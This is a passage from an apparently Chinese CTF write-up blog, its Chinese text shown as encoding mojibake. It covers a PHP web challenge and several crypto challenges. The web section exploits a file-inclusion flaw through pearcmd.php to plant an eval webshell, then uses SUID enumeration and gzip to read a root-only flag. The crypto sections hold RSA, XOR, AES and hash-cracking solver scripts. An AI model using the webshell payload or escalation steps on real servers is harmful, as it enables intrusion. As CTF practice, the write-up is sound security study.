<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;inc/header.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;inc/sidebar.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;!-- Content Wrapper. Contains page content --&gt;</span><br><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span> </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">          <span class="variable">$page</span> =<span class="string">&#x27;pages/&#x27;</span> .<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$page</span> = <span class="string">&#x27;pages/dashboard.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">          <span class="keyword">require_once</span> <span class="variable">$page</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">require_once</span> <span class="string">&#x27;pages/error_page.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">  &lt;!-- Control Sidebar --&gt;</span><br><span class="line">  &lt;aside <span class="class"><span class="keyword">class</span>=&quot;<span class="title">control</span>-<span class="title">sidebar</span> <span class="title">control</span>-<span class="title">sidebar</span>-<span class="title">dark</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;!-- <span class="title">Control</span> <span class="title">sidebar</span> <span class="title">content</span> <span class="title">goes</span> <span class="title">here</span> --&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">aside</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;!-- /.<span class="title">control</span>-<span class="title">sidebar</span> --&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"> &lt;?<span class="title">php</span> <span class="title">require_once</span> &#x27;<span class="title">inc</span>/<span class="title">footer</span>.<span class="title">php</span>&#x27;; ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹è§å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå‚æ•°ä¸<code>.php</code>æ‹¼æ¥<br>ç»§ç»­<code>åˆ©ç”¨pearcmd.phpå®ç°LFI</code></p>
<p>bpæ‹¦æˆªå¹¶å‘é€<br><code>GET /index.php?+config-create+/&amp;page=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1]);?&gt;+1.php</code></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹è§æœ‰flagï¼Œä½†è¯»ä¸åˆ°<br><img src="https://pic1.zhimg.com/80/v2-d2cb1ad5edeacfaa7a7557e082efc645_1440w.png" alt=""><br>æ‹¿èšå‰‘è¿ä¸Š<br><img src="https://pica.zhimg.com/80/v2-3971afe73346d1734b71a8b6a070357b_1440w.png" alt=""></p>
<p>flagæƒé™ä¸å¤Ÿï¼Œå¾—<code>SUIDææƒ</code></p>
<p><code>SUID(Set User ID)æ˜¯ä¸€ç§Linuxæ–‡ä»¶æƒé™ï¼Œå®ƒå…è®¸æ™®é€šç”¨æˆ·ä»¥rootç”¨æˆ·çš„èº«ä»½æ‰§è¡ŒæŸäº›æ“ä½œã€‚åœ¨æ”»å‡»ä¸­ï¼Œå¯ä»¥åˆ©ç”¨SUIDäºŒè¿›åˆ¶æ–‡ä»¶ä»¥è·å–rootæƒé™ã€‚é€šè¿‡æŸ¥æ‰¾ç³»ç»Ÿä¸­çš„SUIDæ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨å®ƒä»¬çš„æ¼æ´å®ç°ææƒæ”»å‡»ï¼Œå¯ä»¥è·å¾—æ›´é«˜çš„æƒé™</code></p>
<p><img src="https://picx.zhimg.com/80/v2-1a3cd5b6028408cf6afd3fcc8f904dad_1440w.png" alt=""></p>
<p>é¦–å…ˆæŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„å‘½ä»¤<br><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<p><img src="https://picx.zhimg.com/80/v2-19ebd82b5e9428c617d1332a4a2be19e_1440w.png" alt=""></p>
<p>gzipå‘½ä»¤æœ‰SUIDæƒé™ï¼Œgzipè¯»æ–‡ä»¶<br><code>gzip -f /flag -t</code></p>
<h3 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive()"></a>NextDrive()</h3><p>å¾…çœ‹ingâ€¦â€¦</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="week1-1"><a href="#week1-1" class="headerlink" title="week1"></a>week1</h2><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>é¢˜ç›®å³è€ƒç‚¹<br>åœ¨çº¿ç½‘ç«™<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services">https://www.splitbrain.org/services</a><br>åˆæˆ–è€…æ‰¾ä¸ªå·¥å…·æ¢­äº†</p>
<h3 id="Caesarâ€™s-Secert"><a href="#Caesarâ€™s-Secert" class="headerlink" title="Caesarâ€™s Secert"></a>Caesarâ€™s Secert</h3><p>é¢˜ç›®å³è€ƒç‚¹</p>
<h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p>é¢˜ç›®å³è€ƒç‚¹</p>
<h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="VigenÃ¨re"></a>VigenÃ¨re</h3><p><code>le chiffre indÃ©chiffrable</code>ï¼Œæ³•è¯­å§<br><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a><br>ç„¶åé€‰æ‹©æ³•è¯­ï¼Œå…¶å®ä¹Ÿå¯ä»¥é€šè¿‡flagå¤´ç¡®å®škey</p>
<h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><p>base64ï¼Œbase32ï¼Œuuencode(ä¸base64ç›¸ä¼¼ï¼Œä½†åŒ…å«å¾ˆå¤šç‰¹æ®Šå­—ç¬¦ï¼Œæ€»ç»“å°±æ˜¯çœ‹ä¸Šå»å¾ˆå¥‡æ€ªï¼Œè¿˜æœ‰ä¸ªxxencodeï¼Œç‰¹å¾è·Ÿbase64ç›¸ä¼¼)<br>uuencodeçš„è¯éšæ³¢å‡ºä¸äº†ï¼Œå¥½åƒç¼ºäº†ä¸€éƒ¨åˆ†ï¼Œå»æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™å°±å¥½äº†<br><a target="_blank" rel="noopener" href="http://www.hiencode.com/">http://www.hiencode.com/</a></p>
<h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>ç›´æ¥åˆ†è§£n</p>
<h3 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h3><p>è¿åˆ†æ•°åˆ†è§£ï¼Œç»´çº³æ”»å‡»</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContinuedFraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        self.numberlist = []</span><br><span class="line">        self.fractionlist = []</span><br><span class="line">        self.GenerateNumberList(numerator, denumerator)</span><br><span class="line">        self.GenerateFractionList()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateNumberList</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        <span class="keyword">while</span> numerator != <span class="number">1</span>:</span><br><span class="line">            quotient = numerator//denumerator</span><br><span class="line">            remainder = numerator % denumerator</span><br><span class="line">            self.numberlist.append(quotient)</span><br><span class="line">            numerator = denumerator</span><br><span class="line">            denumerator = remainder</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateFractionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.fractionlist.append([self.numberlist[<span class="number">0</span>], <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.numberlist)):</span><br><span class="line">            numerator = self.numberlist[i]</span><br><span class="line">            denumerator = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                temp = numerator</span><br><span class="line">                numerator = denumerator+numerator*self.numberlist[i-j-<span class="number">1</span>]</span><br><span class="line">                denumerator = temp</span><br><span class="line">            self.fractionlist.append([numerator, denumerator])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">a = ContinuedFraction(e, n)</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> a.fractionlist:</span><br><span class="line">    s = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(s.decode())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append(f ^ key)</span><br></pre></td></tr></table></figure>
<p>ä»è¿™æ®µåŠ å¯†é€»è¾‘å¯ä»¥çœ‹å‡ºæ¥æ˜¯ï¼Œå•å­—èŠ‚å¼‚æˆ–ï¼Œæ‰€ä»¥keyçš„èŒƒå›´åœ¨[0,255]<br>å¯ä»¥çˆ†ç ´</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> xor(<span class="built_in">bytes</span>([i]), b):</span><br><span class="line">        <span class="built_in">print</span>(xor(<span class="built_in">bytes</span>([i]), b))</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…ç›´æ¥ç®—å‡ºkey</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = <span class="number">0xe9</span> ^ <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">b = <span class="number">0xe9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br><span class="line">b = long_to_bytes(b)</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += long_to_bytes(i ^ key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>ä»¿å°„å¯†ç ï¼Œæˆ‘ä»¬å·²çŸ¥flagå¤´ï¼Œå¯ä»¥åæ¨key</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&#x27;</span></span><br><span class="line">m = <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)+j) % m == <span class="number">0xdd</span> <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>)+j) % m == <span class="number">0x43</span> <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+j) % m == <span class="number">0x88</span> <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>)+j) % m == <span class="number">0xee</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">x = <span class="number">17</span></span><br><span class="line">y = <span class="number">23</span></span><br><span class="line">inv_x = inverse(x, m)</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), <span class="number">2</span>):</span><br><span class="line">    flag += long_to_bytes(inv_x*(<span class="built_in">int</span>(b[i:i+<span class="number">2</span>], <span class="number">16</span>)-y) % m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h3><p>æ‰¾åˆ°keyè·Ÿivå°±å¯ä»¥è§£å‡ºæ¥<br>æ ¹æ®<code>bytes_to_long(key) ^ bytes_to_long(iv) ^ 1</code>ï¼Œè¿˜æœ‰<code>key = os.urandom(16) * 2</code><br>æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°å‰åŠæ®µkeyï¼Œåˆå› ä¸ºå‰åéƒ¨åˆ†ç›¸åŒï¼Œå¾—åˆ°å®Œæ•´çš„keyï¼Œå†å¼‚æˆ–ä¸€ä¸‹å°±å¯ä»¥æ‹¿åˆ°iv</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line">a = <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span> ^ <span class="number">1</span></span><br><span class="line">b = long_to_bytes(a)</span><br><span class="line">key = b[:<span class="built_in">len</span>(b)//<span class="number">2</span>]*<span class="number">2</span></span><br><span class="line">iv = long_to_bytes(bytes_to_long(key) ^ a)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="week2-1"><a href="#week2-1" class="headerlink" title="week2"></a>week2</h2><h3 id="æ»´å•¤"><a href="#æ»´å•¤" class="headerlink" title="æ»´å•¤"></a>æ»´å•¤</h3><p><code>dpæ³„éœ²æ”»å‡»</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = </span><br><span class="line">dp = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (n % ((dp*e-<span class="number">1</span>)//i+<span class="number">1</span>)) == <span class="number">0</span>:</span><br><span class="line">            p = (dp*e-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">            q = n // p  <span class="comment"># æ³¨æ„éƒ½æ˜¯æ•´é™¤</span></span><br><span class="line">            phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e, phi_n)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="ä¸æ­¢ä¸€ä¸ªpi"><a href="#ä¸æ­¢ä¸€ä¸ªpi" class="headerlink" title="ä¸æ­¢ä¸€ä¸ªpi"></a>ä¸æ­¢ä¸€ä¸ªpi</h3><p>è®¡ç®—$\phi(n)$</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q = </span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line">n = p**<span class="number">3</span>*q**<span class="number">2</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (<span class="built_in">pow</span>(p, <span class="number">3</span>)-<span class="built_in">pow</span>(p, <span class="number">2</span>))*(<span class="built_in">pow</span>(q, <span class="number">2</span>)-q)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="halfcandecode"><a href="#halfcandecode" class="headerlink" title="halfcandecode"></a>halfcandecode</h3><p>å‰åŠæ®µï¼Œpqç›¸è¿‘å¼€å¹³æ–¹çˆ†ç ´</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">n</span>):</span><br><span class="line">    a, f = gmpy2.iroot(n, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b, f = gmpy2.iroot(a*a - n, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">return</span> a-b, a+b</span><br><span class="line">p = factor(n)[<span class="number">0</span>]</span><br><span class="line">q = factor(n)[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…ï¼Œè´¹é©¬åˆ†è§£æ³•ï¼Œå·®ä¸å¤šå§</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = </span><br><span class="line">n2 = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = sympy.nextprime(n2)</span><br><span class="line">q = n//p</span><br></pre></td></tr></table></figure>
<p>ååŠéƒ¨åˆ†å¯ä»¥æ‰¾ä¸ªç½‘ç«™æ‰‹åŠ¨è§£ï¼Œä¹Ÿå¯ä»¥ç›´æ¥çˆ†ç ´<br><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p>å‚è€ƒå®˜æ–¹è„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">md5_hash = [</span><br><span class="line">    <span class="string">&#x27;4a8a08f09d37b73795649038408b5f33&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b14a7b8059d9c055954c92674ce60032&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e358efa489f58062f10dd7316b65649e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b14a7b8059d9c055954c92674ce60032&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4a8a08f09d37b73795649038408b5f33&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e358efa489f58062f10dd7316b65649e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4b43b0aee35624cd95b910189b3dc231&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mm = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> md5_hash:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">if</span> md5(p.encode()).hexdigest() == h:</span><br><span class="line">            mm += p</span><br><span class="line"><span class="built_in">print</span>(mm)</span><br></pre></td></tr></table></figure>
<h3 id="Rotate-Xor"><a href="#Rotate-Xor" class="headerlink" title="Rotate Xor"></a>Rotate Xor</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line">k1 = getPrime(<span class="number">64</span>)</span><br><span class="line">k2 = getPrime(<span class="number">64</span>)</span><br><span class="line">ROUND = <span class="number">12</span></span><br><span class="line">ciphertext = xor(flag, long_to_bytes(k1))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_rotate_left</span>(<span class="params">num, step</span>):</span><br><span class="line">    <span class="keyword">return</span> ((num) &lt;&lt; step | num &gt;&gt; (<span class="number">64</span>-step)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_key</span>(<span class="params">key</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUND):</span><br><span class="line">        key = round_rotate_left(key, <span class="number">3</span>) ^ k2</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ciphertext =&#x27;</span>, ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc_k1 =&#x27;</span>, encrypt_key(k1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k2 =&#x27;</span>, k2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ciphertext = b&#x27;\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde`zl\xc0\x85\xe0\xe4\xdfQlc&#x27;</span></span><br><span class="line"><span class="comment"># enc_k1 = 7318833940520128665</span></span><br><span class="line"><span class="comment"># k2 = 9982833494309156947</span></span><br></pre></td></tr></table></figure>
<p>å°±ä¸¤ä¸ªå‡½æ•°æŒºå¥½ç†è§£çš„<br>Z3æ±‚è§£å™¨çš„ç®€å•ä½¿ç”¨</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">ROUND = <span class="number">12</span></span><br><span class="line">s = Solver()</span><br><span class="line">ciphertext = <span class="string">b&#x27;\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde`zl\xc0\x85\xe0\xe4\xdfQlc&#x27;</span></span><br><span class="line">enc_k1 = BitVecVal(<span class="number">7318833940520128665</span>, <span class="number">64</span>)</span><br><span class="line">k2 = BitVecVal(<span class="number">9982833494309156947</span>, <span class="number">64</span>)</span><br><span class="line">k1 = BitVec(<span class="string">&#x27;k1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUND):</span><br><span class="line">        key = RotateLeft(key, <span class="number">3</span>) ^ k2</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(enc_k1 == encrypt_key(k1))</span><br><span class="line">s.check()</span><br><span class="line">k1 = s.model()[k1].as_long()</span><br><span class="line"></span><br><span class="line">flag = xor(ciphertext, long_to_bytes(k1))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>è¦ä¸‹<code>z3_solver</code><br>æˆ–è€…ç›´æ¥é€†ä¸€ä¸‹æºä»£ç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_rotate_right</span>(<span class="params">num, step</span>):</span><br><span class="line">    <span class="keyword">return</span> ((num) &gt;&gt; step | num &lt;&lt; (<span class="number">64</span>-step)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_key</span>(<span class="params">key</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUND):</span><br><span class="line">        key = round_rotate_right(key ^ k2, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROUND = <span class="number">12</span></span><br><span class="line">k2 = <span class="number">9982833494309156947</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde`zl\xc0\x85\xe0\xe4\xdfQlc&#x27;</span></span><br><span class="line">enc_k1 = <span class="number">7318833940520128665</span></span><br><span class="line">k1 = encrypt_key(enc_k1)</span><br><span class="line">flag = xor(ciphertext, long_to_bytes(k1))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="partial-decrypt"><a href="#partial-decrypt" class="headerlink" title="partial decrypt"></a>partial decrypt</h3><p>ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†CRTå¯¹RSAè¿ç®—è¿›è¡ŒåŠ é€Ÿ(å¯èƒ½æ˜¯å› ä¸ºç”¨äº†Garnerâ€™sæ–¹ç¨‹å¼ï¼Ÿ)ï¼Œå³<code>RSA-CRT</code><br>å˜¶ï¼ŒCRTä¼šï¼ŒRSAä¼šï¼Œä¸¤ä¸ªåŠ èµ·æ¥å°±ä¸ä¼šäº†ï¼Œæ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œåªèƒ½è¯´è¿™ä¸ªæé€ŸæŒºçŒ›çš„<br><a target="_blank" rel="noopener" href="https://youngbug.github.io/cryptography/2022/03/11/RSA-algorithm-using-CRT.html">https://youngbug.github.io/cryptography/2022/03/11/RSA-algorithm-using-CRT.html</a><br>ç»“è®ºï¼Œ<code>m = m2 + h*q</code></p>
<p>$c=m^{e}mod\ n$<br>$m=c^{d}mod\ n$<br>$n=p<em>q$<br>$dp=d(mod\ p-1)=e^{-1}mod(p-1)$<br>$dq=d(mod\ q-1)=e^{-1}mod(q-1)$<br>$m_{1}=c^{dp}mod\ p=c^{d}mod\ p$<br>$m_{2}=c^{dq}mod\ q=c^{d}mod\ q$<br>$qInv=q^{-1}mod\ p$<br>$h=qInv</em>(m_{1}-m_{2})mod\ p$<br>$m=m_{2}+h*q$</p>
